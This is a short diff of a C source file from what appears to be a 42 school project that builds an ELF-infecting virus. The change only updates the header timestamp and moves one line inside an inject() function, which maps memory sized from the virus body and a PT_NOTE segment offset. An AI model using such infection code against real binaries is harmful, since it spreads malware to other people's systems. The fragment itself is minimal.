@@ -6,7 +6,7 @@
 /*   By: ddinaut <ddinaut@student.42.fr>            +#+  +:+       +#+        */
 /*                                                +#+#+#+#+#+   +#+           */
 /*   Created: 2019/03/12 18:20:42 by ddinaut           #+#    #+#             */
-/*   Updated: 2019/04/12 20:34:38 by ddinaut          ###   ########.fr       */
+/*   Updated: 2019/04/13 14:32:26 by ddinaut          ###   ########.fr       */
 /*                                                                            */
 /* ************************************************************************** */
 
@@ -26,8 +26,8 @@ void		inject(t_data *data)
 
 	if (data->context == false || data->context != true)
 		goto next;
-	data->context = false;
 
+	data->context = false;
 	int		size = data->virus.size + data->virus.note->p_offset;
 	uint8_t	*map = _mmap(0, size, PROT_READ | PROT_WRITE, MAP_ANON | MAP_PRIVATE, -1, 0);
 	if (map == MAP_FAILED)
